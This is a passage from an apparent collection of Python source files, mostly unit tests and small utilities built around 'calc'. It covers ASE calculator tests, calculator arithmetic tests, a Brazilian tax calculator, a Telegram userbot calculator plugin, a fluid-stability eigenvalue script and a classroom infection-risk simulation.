factory.calc(xc='LDA',\n                            nsw=-1,\n                            ibrion=-1,\n                            nelm=1,\n                            lwave=False,\n                            lcharg=False,\n                            net_charge=net_charge)\n        calc.initialize(system)\n        calc.write_input(system)\n        calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] == default_nelect_from_vasp + net_charge\n\n    # Test that conflicts between explicitly given nelect and net charge are\n    # detected\n    with pytest.raises(ValueError):\n        with pytest.warns(FutureWarning):\n            calc = factory.calc(xc='LDA',\n                                nsw=-1,\n                                ibrion=-1,\n                                nelm=1,\n                                lwave=False,\n                                lcharg=False,\n                                nelect=default_nelect_from_vasp + net_charge +\n                                1,\n                                net_charge=net_charge)\n            calc.calculate(system)\n\n    # Test that conflicts between charge and net_charge are detected\n    with pytest.raises(ValueError):\n        with pytest.warns(FutureWarning):\n            calc = factory.calc(xc='LDA',\n                                nsw=-1,\n                                ibrion=-1,\n                                nelm=1,\n                                lwave=False,\n                                lcharg=False,\n                                charge=-net_charge - 1,\n                                net_charge=net_charge)\n            calc.calculate(system)\n\n    # Test that nothing is written if net charge is 0 and nelect not given\n    with pytest.warns(FutureWarning):\n        calc = factory.calc(xc='LDA',\n                            nsw=-1,\n                            ibrion=-1,\n                            nelm=1,\n                            lwave=False,\n                            lcharg=False,\n                            net_charge=0)\n        calc.initialize(system)\n        calc.write_input(system)\n        calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] is None\n", "94": "#!/usr/bin/env python\n# Copyright 2013 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nimport unittest\n\nfrom mock_function import MockFunction\n\n\nclass MockFunctionUnittest(unittest.TestCase):\n  def testMockFunction(self):\n    @MockFunction\n    def calc(a, b, mult=1):\n      return (a + b) * mult\n\n    self.assertTrue(*calc.CheckAndReset(0))\n    self.assertEqual(\n        (False, 'calc: expected 1 call(s), got 0'), calc.CheckAndReset(1))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertTrue(*calc.CheckAndReset(1))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertEqual(\n        (False, 'calc: expected 0 call(s), got 1'), calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertTrue(*calc.CheckAndReset(2))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertEqual(\n        (False, 'calc: expected 3 call(s), got 2'), calc.CheckAndReset(3))\n\n\nif __name__ == '__main__':\n  unittest.main()\n", "95": "import unittest\nfrom unittesting.func import calc\n\nclass TestCalc(unittest.TestCase):\n    \n    def test_add_valid(self):\n        self.assertEqual(calc.add(10,5),15)\n        self.assertEqual(calc.add(-1,1),0)\n        self.assertEqual(calc.add(-1,-1),-2)\n\n    def test_sub_valid(self):\n        self.assertEqual(calc.subtract(10,5),5)\n        self.assertEqual(calc.subtract(-1,1),-2)\n        self.assertEqual(calc.subtract(-1,-1),0)\n\n    def test_multiply_valid(self):\n        self.assertEqual(calc.multiply(10,5),50)\n        self.assertEqual(calc.multiply(-1,1),-1)\n        self.assertEqual(calc.multiply(-1,-1),1)\n\n    def test_divide_valid(self):\n        self.assertEqual(calc.divide(10,5),2)\n        self.assertEqual(calc.divide(-1,1),-1)\n        self.assertEqual(calc.divide(-1,-1),1)\n        self.assertEqual(calc.divide(5,2),2.5)\n\n    def test_divide_exception(self):\n        self.assertRaises(ValueError,calc.divide,10,0)\n        with self.assertRaises(ValueError):\n            calc.divide(10,0)", "96": "def test_calculator_label():\n    from ase.calculators.calculator import Calculator\n\n    calc = Calculator()\n    assert calc.directory == '.'\n    assert calc.prefix is None\n    assert calc.label is None\n\n    calc.label = 'dir/pref'\n    assert calc.directory == 'dir'\n    assert calc.prefix == 'pref'\n    assert calc.label == 'dir/pref'\n\n    calc.label = 'dir2/'\n    assert calc.directory == 'dir2'\n    assert calc.prefix is None\n    assert calc.label == 'dir2/'\n\n    calc.label = 'hello'\n    assert calc.directory == '.'\n    assert calc.prefix == 'hello'\n    assert calc.label == 'hello'\n\n    calc.label = None\n    assert calc.label is None\n    assert calc.prefix is None\n    assert calc.directory == '.'\n", "97": "# Autogenerated with SMOP \nfrom smop.core import *\nimport numpy as np\nimport scipy.linalg\nimport matplotlib\n\n# Force matplotlib to not use any Xwindows backend.\nmatplotlib.use('Agg')\n\n    \n@function\ndef calc_orrsommerfeld(alpha=None,R=None,N=None,*args,**kwargs):\n    varargin = calc_orrsommerfeld.varargin\n    nargin = calc_orrsommerfeld.nargin\n\n    # Matlab script to find global eigenvalues for Poiseuille flow\n    \n    # The collocation points are at ybar=cos(m*pi/(N-1)) for m=0..N-1\n# Setup matrix t of Chebyshev polynomials and their derivatives at each collocation\n# point\n    \n    for m in arange(N - 2,2,- 1).reshape(-1):\n        ybar=np.cos(dot(m,np.pi) / (N - 1))\n# calc_orrsommerfeld.m:10\n        t=0.0\n# calc_orrsommerfeld.m:11\n        t[1,1]=1.0\n# calc_orrsommerfeld.m:12\n        t[1,2]=ybar\n# calc_orrsommerfeld.m:13\n        for ii in arange(2,N - 1).reshape(-1):\n            t[1,ii + 1]=dot(dot(2.0,ybar),t[1,ii]) - t[1,ii - 1]\n# calc_orrsommerfeld.m:15\n        for j in arange(2,5).reshape(-1):\n            t[j,1]=0.0\n# calc_orrsommerfeld.m:18\n            t[j,2]=t[j - 1,1]\n# calc_orrsommerfeld.m:19\n            t[j,3]=dot(4.0,t[j - 1,2])\n# calc_orrsommerfeld.m:20\n            for k in arange(4,N).reshape(-1):\n                t[j,k]=dot(dot(2.0,(k - 1.0)),t[j - 1,k - 1]) + dot((k - 1.0) / (k - 3.0),t[j,k - 2])\n# calc_orrsommerfeld.m:22\n        # Evaluate the base flow at value of ybar\n        U=1.0 - ybar ** 2.0\n# calc_orrsommerfeld.m:26\n        dU=dot(- 2.0,ybar)\n# calc_orrsommerfeld.m:27\n        d2U=- 2.0\n# calc_orrsommerfeld.m:28\n        for j in arange(1,N).reshape(-1):\n            a[N - m,j]=dot(U,(t[3,j] - dot(alpha ** 2,t[1,j]))) - dot(d2U,t[1,j]) - dot(1.0 / (dot(dot(1j,alpha),R)),(t[5,j] - dot(dot(2.0,alpha ** 2),t[3,j]) + dot(alpha ** 4.0,t[1,j])))\n# calc_orrsommerfeld.m:31\n            b[N - m,j]=t[3,j] - dot(alpha ** 2,t[1,j])\n# calc_orrsommerfeld.m:32\n    \n    # Boundary conditions\n    for j in arange(1,N).reshape(-1):\n        a[1,j]=1.0\n# calc_orrsommerfeld.m:38\n        a[2,j]=(j - 1.0) ** 2.0\n# calc_orrsommerfeld.m:39\n        a[N - 1,j]=dot((- 1.0) ** (j - 2.0),(j - 1.0) ** 2.0)\n# calc_orrsommerfeld.m:40\n        a[N,j]=(- 1.0) ** (j - 1.0)\n# calc_orrsommerfeld.m:41\n        b[1,j]=0.0\n# calc_orrsommerfeld.m:42\n        b[2,j]=0.0\n# calc_orrsommerfeld.m:43\n        b[N - 1,j]=0.0\n# calc_orrsommerfeld.m:44\n        b[N,j]=0.0\n# calc_orrsommerfeld.m:45\n    \n   # Find eigenvalues c\n    V,D = scipy.linalg.eig(a,b)\n    print('D=',D)\n    diagD = np.diag(D)\n    print('diagD.shape=',diagD.shape)\n    print('diagD=',diagD)\n    imagc = diagD.imag\n    realc = diagD.real\n    # fig, ax = plt.subplots()\n    plt.plot(realc, imagc, 'o')\n    plt.axis([0, 1, -1, 0.1])\n    plt.xlabel('c_r')\n    plt.ylabel('c_i')\n    plt.savefig('orrsom.png', format='png')\n    \n    # Check if there are positive, finite c_i\n    isStable=logical(max(imagc[logical_not(isinf(imagc))]) < 0)\n# calc_orrsommerfeld.m:61\n    return isStable\n    \nif __name__ == '__main__':\n    alpha = 1.0\n    R = 10000\n    N = 121\n    calc_orrsommerfeld(alpha, R, N)\n    ", "98": "# -*- coding: utf-8 -*-\n#\n# ibptws/tests/test_calculadoras.py\n#\n# Copyright 2015 Base4 Sistemas Ltda ME\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nfrom decimal import Decimal\n\nimport pytest\n\nimport requests\n\nfrom ibptws.calculadoras import DeOlhoNoImposto\nfrom ibptws.calculadoras import CEM\n\n\ndef test_deolhonoimposto_inicio():\n    calc = DeOlhoNoImposto()\n    assert calc.carga_federal().is_zero()\n    assert calc.carga_federal_nacional().is_zero()\n    assert calc.carga_federal_importado().is_zero()\n    assert calc.carga_estadual().is_zero()\n    assert calc.carga_municipal().is_zero()\n    assert calc.total_tributos().is_zero()\n    assert calc.total().is_zero()\n    assert calc.percentual_sobre_total().is_zero()\n\n\ndef test_deolhonoimposto_um_item(monkeypatch):\n    def mockreturn(endpoint, params={}):\n        return pytest.instancia_resp_sucesso_produto\n    monkeypatch.setattr(requests, 'get', mockreturn)\n    \n    valor = Decimal('10') # subtotal do produto\n    \n    # os valores das al\u00edquotas retornadas est\u00e3o em conftest.py\n    carga_fed_nac = valor * (Decimal('4.2') / CEM)\n    carga_fed_imp = valor * (Decimal('4.8') / CEM)\n    carga_estadual = valor * (Decimal('18') / CEM)\n    \n    calc = DeOlhoNoImposto()\n    calc.produto('12340101', 0, valor)\n    \n    assert calc.total() == valor, 'Total nao confere com o valor do unico item'\n    assert calc.total() > calc.total_tributos(), 'Soma dos valores dos '\\\n            'itens menor ou igual ao valor total dos tributos'\n            \n    assert calc.carga_federal_nacional() == carga_fed_nac\n    assert calc.carga_federal_importado() == carga_fed_imp\n    assert calc.carga_federal() == carga_fed_nac + carga_fed_imp\n    assert calc.carga_estadual() == carga_estadual\n    assert calc.carga_municipal().is_zero()\n    \n    assert calc.total_tributos() == sum([\n            carga_fed_nac, carga_fed_imp, carga_estadual,])\n    \n    assert calc.total() == valor\n    \n    # testa o reinicio da calculadora\n    calc.reiniciar()\n    assert calc.carga_federal().is_zero()\n    assert calc.carga_federal_nacional().is_zero()\n    assert calc.carga_federal_importado().is_zero()\n    assert calc.carga_estadual().is_zero()\n    assert calc.carga_municipal().is_zero()\n    assert calc.total_tributos().is_zero()\n    assert calc.total().is_zero()\n    assert calc.percentual_sobre_total().is_zero()\n\n\ndef test_deolhonoimposto_multiplos_itens(monkeypatch):\n    def mockreturn(endpoint, params={}):\n        dados = {\n                '12340101': pytest.instancia_resp_sucesso_produto,\n                '12340202': pytest.instancia_resp_sucesso_produto_alt_a,\n                '12340303': pytest.instancia_resp_sucesso_produto_alt_b,\n                '0123': pytest.instancia_resp_sucesso_servico,\n                '0124': pytest.instancia_resp_sucesso_servico_alt_a,}\n        return dados.get(params.get('codigo'))\n    monkeypatch.setattr(requests, 'get', mockreturn)\n    \n    calc = DeOlhoNoImposto()\n\n    calc.produto('12340101', 0, Decimal('5.00'))\n            # nacional     4,2% : 0,21\n            # importado    4,8% : 0,24\n            # estadual      18% : 0,9\n            # muncipal       0% : 0          total tributos: 1,35\n            \n    calc.produto('12340202', 0, Decimal('15.50'))\n            # nacional     4,2% : 0,651\n            # importado   5,41% : 0,83855\n            # estadual       0% : 0\n            # muncipal       0% : 0          total tributos: 1,48955\n            \n    calc.produto('12340303', 0, Decimal('7.30'))\n            # nacional     4,2% : 0,3066\n            # importado   6,18% : 0,45114\n            # estadual      12% : 0,876\n            # muncipal       0% : 0          total tributos: 1,63374\n            \n    calc.servico('0123', Decimal('100'))\n            # nacional   13,45% : 13,45\n            # importado  14,05% : 14,05\n            # estadual       0% :  0\n            # muncipal    4,33% :  4,33      total tributos: 31,83\n            \n    calc.servico('0124', Decimal('575.77'))\n            # nacional   13,45% : 77,441065\n            # importado  14,05% : 80,895685\n            # estadual       0% :  0\n            # muncipal    3,55% : 20,439835  total tributos: 178,776585\n    \n    # total (soma dos valores dos itens) : R$ 703,57\n    # valor total dos tributos           : R$ 215,079875\n    # % total dos tributos sobre o valor : 30,569790497%\n    \n    carga_fed_nac = sum([\n            Decimal('0.21'),\n            Decimal('0.651'),\n            Decimal('0.3066'),\n            Decimal('13.45'),\n            Decimal('77.441065'),])\n    \n    carga_fed_imp = sum([\n            Decimal('0.24'),\n            Decimal('0.83855'),\n            Decimal('0.45114'), # inclui os zeros para ilustrar\n            Decimal('14.05'),\n            Decimal('80.895685'),])\n            \n    carga_estadual = sum([\n            Decimal('0.9'),\n            Decimal('0'),\n            Decimal('0.876'),\n            Decimal('0'),\n            Decimal('0'),])\n            \n    carga_municipal = sum([\n            Decimal('0'),\n            Decimal('0'),\n            Decimal('0'),\n            Decimal('4.33'),\n            Decimal('20.439835'),])\n    \n    total_tributos = sum([\n            carga_fed_nac,\n            carga_fed_imp,\n            carga_estadual,\n            carga_municipal,])\n    \n    total = Decimal('703.57')\n    p_sobre_total = total_tributos / total\n            \n    assert calc.total() == total, 'Total nao confere com o valor do unico item'\n    assert calc.total() > calc.total_tributos(), 'Soma dos valores dos '\\\n            'itens menor ou igual ao valor total dos tributos'\n            \n    assert calc.carga_federal_nacional() == carga_fed_nac\n    assert calc.carga_federal_importado() == carga_fed_imp\n    assert calc.carga_federal() == carga_fed_nac + carga_fed_imp\n    assert calc.carga_estadual() == carga_estadual\n    assert calc.carga_municipal() == carga_municipal\n    \n    assert calc.total_tributos() == total_tributos\n    \n    assert calc.total() == total\n    assert calc.percentual_sobre_total() == p_sobre_total\n    \n    # testa o reinicio da calculadora\n    calc.reiniciar()\n    assert calc.carga_federal().is_zero()\n    assert calc.carga_federal_nacional().is_zero()\n    assert calc.carga_federal_importado().is_zero()\n    assert calc.carga_estadual().is_zero()\n    assert calc.carga_municipal().is_zero()\n    assert calc.total_tributos().is_zero()\n    assert calc.total().is_zero()\n    assert calc.percentual_sobre_total().is_zero()\n", "99": "import pytest\nfrom ase.build import bulk\n\n\nomx_par = {'definition_of_atomic_species': [['Al', 'Al8.0-p1', 'Al_CA13'],\n                                            ['O', 'O6.0-p1', 'O_CA13']]}\n\n\ncalc = pytest.mark.calculator\n\n\n@calc('openmx', **omx_par)\n@calc('elk', rgkmax=5.0)\ndef test_al(factory):\n    name = factory.name\n    # What on earth does kpts=1.0 mean?  Was failing, I changed it.  --askhl\n    # Disabled GPAW since it was failing anyway. --askhl\n    kpts = [2, 2, 2]\n    calc = factory.calc(label=name, xc='LDA', kpts=kpts)\n    al = bulk('AlO', crystalstructure='rocksalt', a=4.5)\n    al.calc = calc\n    e = al.get_potential_energy()\n    calc.set(xc='PBE', kpts=kpts)\n    epbe = al.get_potential_energy()\n    print(e, epbe)\n    calc = factory.calc(restart=name)\n    print(calc.parameters, calc.results, calc.atoms)\n    assert not calc.calculation_required(al, ['energy'])\n    al = calc.get_atoms()\n    print(al.get_potential_energy())\n    label = 'dir/' + name + '-2'\n    calc = factory.calc(label=label, atoms=al, xc='LDA', kpts=kpts)\n    print(al.get_potential_energy())\n", "100": "from pathlib import Path\nimport pytest\nfrom ase.calculators.calculator import Calculator\n\n\n\ndef test_directory_and_label():\n    def normalize(path):\n        \"\"\"Helper function to normalize path\"\"\"\n        return str(Path(path))\n\n    calc = Calculator()\n\n    assert calc.directory == '.'\n    assert calc.label is None\n\n    calc.directory = 'somedir'\n\n    assert calc.directory == 'somedir'\n    assert calc.label == 'somedir/'\n\n    # We cannot redundantly specify directory\n    with pytest.raises(ValueError):\n        calc = Calculator(directory='somedir',\n                          label='anotherdir/label')\n\n    # Test only directory in directory\n    calc = Calculator(directory='somedir',\n                      label='label')\n\n    assert calc.directory == 'somedir'\n    assert calc.label == 'somedir/label'\n\n    wdir = '/home/somedir'\n    calc = Calculator(directory=wdir,\n                      label='label')\n\n    assert calc.directory == normalize(wdir)\n    assert calc.label == normalize(wdir) + '/label'\n\n    # Test we can handle pathlib directories\n    wdir = Path('/home/somedir')\n    calc = Calculator(directory=wdir,\n                      label='label')\n    assert calc.directory == normalize(wdir)\n    assert calc.label == normalize(wdir) + '/label'\n\n    with pytest.raises(ValueError):\n        calc = Calculator(directory=wdir,\n                          label='somedir/label')\n\n    # Passing in empty directories with directories in label should be OK\n    for wdir in ['somedir', '/home/directory']:\n        label = wdir + '/label'\n        expected_label = normalize(wdir) + '/label'\n        calc = Calculator(directory='', label=label)\n        assert calc.label == expected_label\n        assert calc.directory == normalize(wdir)\n\n        calc = Calculator(directory='.', label=label)\n        assert calc.label == expected_label\n        assert calc.directory == normalize(wdir)\n\n\ndef test_deprecated_get_spin_polarized():\n    calc = Calculator()\n    with pytest.warns(FutureWarning):\n        spinpol = calc.get_spin_polarized()\n    assert spinpol is False\n", "101": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "102": "import numpy as np\nimport pandas as pd\nimport math\nfrom getCountyCases import getCountyCases\nimport statistics\n\ne = math.e\n\n\ndef calculate(numFaculty, numStudents, numSessions, durationSessions, classFloorArea, classHeight, county, state, infectionRate):\n    num_faculty = numFaculty\n    num_students = numStudents\n    num_class_periods = numSessions\n    duration = durationSessions/60\n    floor_area = classFloorArea\n    height = classHeight\n    volume = floor_area*height*(0.305**3)\n    county = county\n    state = state\n\n    # Default Values:\n    # num_faculty = 1\n    # num_students = 10\n    # duration = 75/60\n    # num_class_periods = 26\n    # floor_area = 900\n    # height = 10\n\n    ventilation_w_outside_air = [1, 4, 1]\n    decay_rate_of_virus = [0, 1.0, 1]\n    deposition_to_surface = [0.3, 1.5, 1]\n    additional_control_measures = [0, 0, 1]\n    quanta_emission_rate_faculty = [1.5, 0.71, 1]\n    quanta_emission_rate_student = [0.69, 0.71, 1]\n    exhalation_mask_efficiency = [0.4, 0.6, 1]\n    inhalation_mask_efficiency = [0.3, 0.5, 1]\n    inhalation_rate_faculty = [0.005, 0.01, 1]\n    inhalation_rate_student = [0.005, 0.007, 1]\n\n    if infectionRate != None:\n        percent_faculty_infectious = [infectionRate/100, 2*(infectionRate/100), 0]\n        percent_student_infectious = [infectionRate/100, 2*(infectionRate/100), 0]\n    else:\n        percent_faculty_infectious = getCountyCases(county, state)\n        percent_student_infectious = percent_faculty_infectious\n\n    ############################\n\n    def randomizeAll():\n        randomize(ventilation_w_outside_air)\n        randomize(decay_rate_of_virus)\n        randomize(deposition_to_surface)\n        randomize(additional_control_measures)\n        randomize(exhalation_mask_efficiency)\n        randomize(inhalation_mask_efficiency)\n        randomize(inhalation_rate_faculty)\n        randomize(inhalation_rate_student)\n        randomize(percent_faculty_infectious)\n        randomize(percent_student_infectious)\n\n        randomizeFromNormal(quanta_emission_rate_faculty)\n        randomizeFromNormal(quanta_emission_rate_student)\n\n    def randomize(bounds):\n        bounds[2] = bounds[0] + np.random.random_sample() * \\\n            (bounds[1]-bounds[0])\n\n    def randomizeFromNormal(normdist):\n        normdist[2] = 10**np.random.normal(normdist[0], normdist[1])\n        ##also does the UNDO LOG\n\n    # Q_f: quanta emission rate by infected faculty\n    # m_out: mask exhalation efficiency\n    # k: first order loss coefficients for ventilation , decay, deposition, and other control measures\n    # V: volume of classroom\n    # T: duration of each in-person class session\n\n    # Average quanta concentration during class period if 1 faculty member is infected:\n    def calc_Cf(Q_f, m_out, k, V, T):\n        cf = ((Q_f*(1-m_out))/(k*V))*(1-(1/(k*T))*(1-e**(-k*T)))\n\n        return cf\n\n    # Average quanta concentration during class period if 1 student is infected:\n    def calc_Cs(Q_s, m_out, k, V, T):\n        cs = ((Q_s*(1-m_out))/(k*V))*(1-(1/(k*T))*(1-e**(-k*T)))\n        return cs\n\n    # Quanta inhaled by student if 1 faculty infected:\n    def calc_Nfs(C_f, I_s, m_in, T):\n        Nfs = C_f*I_s*(1-m_in)*T\n        return Nfs\n\n    # Quanta inhaled by faculty if 1 student infected:\n    def calc_Nsf(C_s, I_f, m_in, T):\n        Nsf = C_s*I_f*(1-m_in)*T\n        return Nsf\n\n    # Quanta inhaled by student if 1 student infected\n    def calc_Nss(C_s, I_s, m_in, T):\n        Nss = C_s*I_s*(1-m_in)*T\n        return Nss\n\n    # Probability of 1 faculty infecting student:\n    def calc_pfs(f_f, N_fs):\n        pfs = f_f*(1-np.exp(-N_fs))\n        return pfs\n\n    # Probability of 1 student infecting faculty:\n    def calc_psf(f_s, N_sf):\n        psf = f_s*(1-np.power(e, -N_sf))\n        return psf\n\n    # Probability of 1 student infecting student:\n    def calc_pss(f_s, N_ss):\n        pss = f_s*(1-np.power(e, -N_ss))\n        return pss\n\n    # Probability of faculty infection in one class session:\n    def calc_p1f(p_sf, N_s):\n        p1f = 1-(1-p_sf)**(N_s)\n        return p1f\n\n    # Probability of student infection in one class session:\n    def calc_p1s(p_ss, n_s, p_fs, n_f):\n        p1s = 1-((1-p_ss)**(n_s-1)*(1-p_fs)**n_f)\n        return p1s\n\n    # Probability of faculty infection for semester:\n    def calc_pf(p1_f, n_c):\n        pf = 1-(1-p1_f)**n_c\n        return pf\n\n    # Probability of student infection for semester:\n    def calc_ps(p1_s, n_c):\n        ps = 1-(1-p1_s)**n_c\n        return ps\n\n    trials = 10000\n    fac_runs = np.zeros(trials)\n    student_runs = np.zeros(trials)\n    for x in range(trials):\n        randomizeAll()\n\n        cf = calc_Cf(quanta_emission_rate_faculty[2], exhalation_mask_efficiency[2], (ventilation_w_outside_air[2] +\n                                                                                      decay_rate_of_virus[2]+deposition_to_surface[2]+additional_control_measures[2]), volume, duration)\n        #print(\"cf: \", cf)\n        cs = calc_Cs(quanta_emission_rate_student[2], exhalation_mask_efficiency[2], (ventilation_w_outside_air[2] +\n                                                                                    decay_rate_of_virus[2]+deposition_to_surface[2]+additional_control_measures[2]), volume, duration)\n        #print(\"cs: \", cs)\n        Nfs = calc_Nfs(\n            cf, inhalation_rate_student[2]*60, inhalation_mask_efficiency[2], duration)\n        #print(\"Nfs: \", Nfs)\n        Nsf = calc_Nsf(\n            cs, inhalation_rate_faculty[2]*60, inhalation_mask_efficiency[2], duration)\n        #print(\"Nsf: \", Nsf)\n        Nss = calc_Nss(\n            cs, inhalation_rate_student[2]*60, inhalation_mask_efficiency[2], duration)\n        #print(\"Nss: \", Nss)\n        Pfs = calc_pfs(percent_faculty_infectious[2], Nfs)\n        # print(\"f_f: \", percent_faculty_infectious)\n        #print(\"Pfs: \", Pfs)\n        Psf = calc_psf(percent_student_infectious[2], Nsf)\n        #print(\"Psf: \", Psf)\n        Pss = calc_pss(percent_student_infectious[2], Nss)\n        #print(\"Pss: \", Pss)\n        P1f = calc_p1f(Psf, num_students)\n        #print(\"P1f: \", P1f)\n        P1s = calc_p1s(Pss, num_students, Pfs, num_faculty)\n        #print(\"P1s: \", P1s)\n        Pf = calc_pf(P1f, num_class_periods)\n        #print(\"Pf: \", Pf)\n        Ps = calc_ps(P1s, num_class_periods)\n        #print(\"Ps: \", Ps)\n        fac_runs[x] = Pf\n        student_runs[x] = Ps\n\n    student_mean = round(statistics.mean(student_runs)*100, 2)\n    fac_mean = round(statistics.mean(fac_runs)*100, 2)\n\n    student_quants_05 = np.quantile(student_runs, 0.05)\n    student_quants_25 = np.quantile(student_runs, 0.25)\n    student_quants_50 = np.quantile(student_runs, 0.50)\n    student_quants_75 = np.quantile(student_runs, 0.75)\n    student_quants_95 = np.quantile(student_runs, 0.95)\n\n    fac_quants_05 = np.quantile(fac_runs, 0.05)\n    fac_quants_25 = np.quantile(fac_runs, 0.25)\n    fac_quants_50 = np.quantile(fac_runs, 0.50)\n    fac_quants_75 = np.quantile(fac_runs, 0.75)\n    fac_quants_95 = np.quantile(fac_runs, 0.95)\n\n    studentResults = {'student_quants_05': round(student_quants_05*100, 2),\n                      'student_quants_25': round(student_quants_25*100, 2),\n                      'student_quants_50': round(student_quants_50*100, 2),\n                      'student_quants_75': round(student_quants_75*100, 2),\n                      'student_quants_95': round(student_quants_95*100, 2)}\n\n    facultyResults = {'fac_quants_05': round(fac_quants_05*100, 2),\n                      'fac_quants_25': round(fac_quants_25*100, 2),\n                      'fac_quants_50': round(fac_quants_50*100, 2),\n                      'fac_quants_75': round(fac_quants_75*100, 2),\n                      'fac_quants_95': round(fac_quants_95*100, 2)}\n\n\n    percent_faculty_infectious = [percent_faculty_infectious[0]*100, percent_faculty_infectious[1]*100, 0]\n    percent_student_infectious = [percent_student_infectious[0]*100, percent_student_infectious[1]*100, 0]\n\n    return (student_mean, fac_mean, studentResults, facultyResults, percent_faculty_infectious, percent_student_infectious)\n", "103": "# -*- coding: utf-8 -*-\n\nfrom __future__ import print_function\n\nimport nose\nfrom nose.tools import raises\n\nimport calculator as Calc\n\n# test Variable class\n\ndef test_variable_init_none():\n    var = Calc.Variable()\n    assert var.type == None\n\n\ndef test_variable_init_number():\n    token = Calc.Token('24.67', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var = Calc.Variable(token)\n    assert var.a == 0\n    assert var.b == 24.67\n    assert var.type == Calc.LexType.NUMBER\n    assert var.position == 12\n\n\ndef test_variable_init_variable():\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var = Calc.Variable(token)\n    assert var.a == 1.0\n    assert var.b == 0.0\n    assert var.type == Calc.LexType.VARIABLE\n    assert var.position == 12\n\n\ndef test_variable_init_float():\n    token = Calc.Token('24.67', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var = Calc.Variable(token)\n    assert float(var) == 24.67\n\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var = Calc.Variable(token)\n    var.a = 2\n    var.b = 1\n    assert float(var) == -0.5\n\n\ndef test_variable_init_neg():\n    token = Calc.Token('24.67', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var = Calc.Variable(token)\n    var = -var\n    assert var.a == 0\n    assert var.b == -24.67\n\n    token = Calc.Token('x', Calc.LexType.VARIABLE, 